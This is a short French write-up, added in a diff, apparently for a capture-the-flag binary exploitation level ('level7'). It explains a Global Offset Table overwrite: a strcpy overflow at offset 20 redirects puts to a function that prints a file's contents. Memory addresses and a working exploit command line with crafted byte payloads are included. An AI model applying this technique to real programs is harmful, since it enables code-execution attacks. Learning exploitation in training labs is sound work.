@@ -1,0 +1,16 @@
+
+Ici on override la Global offset table afin de remplacer l'addresse de puts par l'addresse de m.
+
+- 0x080485bd <+156>:	call   0x80483e0 <strcpy@plt> -> OverFlow
+
+- objdump -d level7 -> recuperer l'addresse du jump inside puts -> 0x8049928
+
+- gdb level7
+disas m -> recuperer addresse -> 0x080484f4
+
+- il y a un segfault sur le second strcpy auqnd le premier argument est > 20 -> Offset == 20
+
+- On va donc modifier le jump dans puts pour call notre function m qui elle pourra print le resultat de fopen
+
+- ./level7 `python -c 'print "\x90"*20+"\x28\x99\x04\x08"'` `python -c 'print "\xf4\x84\x04\x08"'`
+
